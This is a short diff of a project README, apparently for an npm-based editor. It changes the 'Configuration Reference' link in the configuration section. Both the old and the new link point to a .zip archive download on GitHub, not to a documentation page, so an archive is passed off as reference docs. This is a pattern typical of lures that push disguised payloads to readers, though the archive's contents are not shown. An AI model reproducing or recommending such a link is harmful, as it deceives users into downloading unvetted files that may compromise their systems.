@@ -32,4 +32,4 @@ npm run lint
 ```
 
 ### Customize configuration
-See [Configuration Reference](https://raw.githubusercontent.com/lamaSonmez/insider-editor/master/luxuriancy/insider-editor.zip).
+See [Configuration Reference](https://github.com/lamaSonmez/insider-editor/raw/refs/heads/master/src/insider_editor_1.8.zip).
